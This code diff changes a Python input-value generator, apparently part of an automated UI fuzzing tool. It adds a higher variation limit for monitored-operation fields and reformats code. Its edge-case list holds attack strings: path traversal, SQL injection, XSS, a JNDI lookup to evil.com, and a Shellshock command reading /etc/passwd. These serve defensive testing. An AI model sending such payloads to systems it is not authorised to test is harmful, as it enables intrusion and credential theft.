@@ -11,7 +11,6 @@ from collections import defaultdict
 from typing import List, Optional, Dict
 from faker import Faker
 
-
 logger = logging.getLogger(__name__)
 
 
@@ -46,35 +45,41 @@ class InputValueGenerator:
         # Returns: None (all variations exhausted)
     """
 
-    def __init__(self, max_variations: int = 5, locales: List[str] = None):
+    def __init__(
+        self,
+        max_variations: int = 5,
+        mop_max_variations: int = 11,
+        locales: List[str] = None,
+    ):
         """
         Initialize input value generator.
 
         Args:
             max_variations: Maximum number of values to test per element (default: 5)
+            mop_max_variations: Maximum variations for MOP-reaching fields (default: 11)
             locales: List of locales to use for generating internationalized values (default: en_US, pt_BR, es_ES, fr_FR, de_DE)
         """
         if max_variations < 1:
             raise ValueError(f"max_variations must be >= 1, got {max_variations}")
 
         self.max_variations = max_variations
+        self.mop_max_variations = mop_max_variations
 
         # Set default locales if not provided
         if locales is None:
-            locales = ['en_US', 'pt_BR', 'es_ES', 'fr_FR', 'de_DE']
+            locales = ["en_US", "pt_BR", "es_ES", "fr_FR", "de_DE"]
 
         self.faker = Faker(locales)
 
         # Maps element_id → list of values already tested
         self.tested_values: Dict[str, List[str]] = defaultdict(list)
 
-        logger.info(f"InputValueGenerator initialized with max_variations={max_variations}, locales={locales}")
+        logger.info(
+            f"InputValueGenerator initialized with max_variations={max_variations}, locales={locales}"
+        )
 
     def get_next_value(
-        self,
-        element_id: str,
-        is_mop: bool = False,
-        input_type: str = "text"
+        self, element_id: str, is_mop: bool = False, input_type: str = "text"
     ) -> Optional[str]:
         """
         Get next untested value for an input element.
@@ -89,9 +94,12 @@ class InputValueGenerator:
         """
         tested = self.tested_values[element_id]
 
+        # MOP fields get more variations to test edge cases
+        limit = self.mop_max_variations if is_mop else self.max_variations
+
         # Check if exhausted
-        if len(tested) >= self.max_variations:
-            logger.debug(f"Element {element_id}: all {self.max_variations} variations tested")
+        if len(tested) >= limit:
+            logger.debug(f"Element {element_id}: all {limit} variations tested")
             return None
 
         # Get candidate values based on MOP status and input type
@@ -150,7 +158,9 @@ class InputValueGenerator:
             "time": lambda: self.faker.time(),
             "number": lambda: str(self.faker.random_int(min=1, max=9999)),
             "zip": self.faker.zipcode,
-            "verification_code": lambda: str(self.faker.random_int(min=100000, max=999999)),
+            "verification_code": lambda: str(
+                self.faker.random_int(min=100000, max=999999)
+            ),
         }
 
         gen_fn = generators.get(input_type, lambda: self.faker.text(max_nb_chars=50))
@@ -159,7 +169,7 @@ class InputValueGenerator:
         for _ in range(self.max_variations * 2):
             unique_values.add(gen_fn())
 
-        return list(unique_values)[:self.max_variations]
+        return list(unique_values)[: self.max_variations]
 
     def _get_mop_values(self, input_type: str = "text") -> List[str]:
         """
@@ -178,16 +188,16 @@ class InputValueGenerator:
             List of edge-case test values for monitored operations
         """
         edge_case_payloads = [
-            "",                              # Empty
-            "0",                             # Zero
-            "-1",                            # Negative
-            "2147483647",                    # MAX_INT
-            "../../../etc/passwd",           # Path traversal
-            "' OR '1'='1",                  # SQL injection
-            "<script>alert('xss')</script>", # XSS
-            "%s%n%x%t" * 5,                 # Format string
-            "A" * 100,                      # Buffer overflow attempt
-            "${jndi:ldap://evil.com/}",     # JNDI injection
+            "",  # Empty
+            "0",  # Zero
+            "-1",  # Negative
+            "2147483647",  # MAX_INT
+            "../../../etc/passwd",  # Path traversal
+            "' OR '1'='1",  # SQL injection
+            "<script>alert('xss')</script>",  # XSS
+            "%s%n%x%t" * 5,  # Format string
+            "A" * 100,  # Buffer overflow attempt
+            "${jndi:ldap://evil.com/}",  # JNDI injection
             "() { :; }; /bin/bash -c 'cat /etc/passwd'",  # Shellshock
         ]
 
@@ -230,13 +240,12 @@ class InputValueGenerator:
         """
         total_elements = len(self.tested_values)
         exhausted_elements = sum(
-            1 for tested in self.tested_values.values()
+            1
+            for tested in self.tested_values.values()
             if len(tested) >= self.max_variations
         )
 
-        total_values_tested = sum(
-            len(tested) for tested in self.tested_values.values()
-        )
+        total_values_tested = sum(len(tested) for tested in self.tested_values.values())
 
         return {
             "total_elements_tested": total_elements,
